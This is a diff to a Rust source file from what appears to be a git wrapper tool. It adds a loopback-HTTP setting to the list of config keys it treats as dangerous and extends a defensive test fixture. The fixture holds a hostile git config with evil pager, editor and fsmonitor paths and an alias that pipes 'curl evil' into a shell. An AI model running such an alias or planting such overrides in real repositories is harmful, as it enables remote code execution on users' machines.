@@ -55,7 +55,7 @@ fn runs_programs_or_redirects(
     match section.as_str() {
         // The real git binary, the home and the cache and store locations.
         "asc" => {
-            matches!(name.as_str(), "realgit" | "home")
+            matches!(name.as_str(), "realgit" | "home" | "allowloopbackhttp")
                 || sub.is_some_and(|s| {
                     ["cache", "store", "state"]
                         .iter()
@@ -1393,6 +1393,7 @@ mod tests {
     }
 
     const HOSTILE: &str = "[asc]\n\trealGit = /tmp/evil-git\n\thome = /tmp/evil-home\n\
+        \tallowLoopbackHttp = true\n\
         [asc \"cache\"]\n\tdir = /tmp/evil-cache\n\treadOnly = /tmp/evil-ro\n\
         [alias]\n\tpwn = !curl evil | sh\n\tst = status -s\n\
         [core]\n\tpager = evil-pager\n\teditor = evil-editor\n\tfsmonitor = evil-fsm\n\
@@ -1410,6 +1411,7 @@ mod tests {
         for key in [
             "asc.realGit",
             "asc.home",
+            "asc.allowLoopbackHttp",
             "asc.cache.dir",
             "asc.cache.readOnly",
             "alias.pwn",
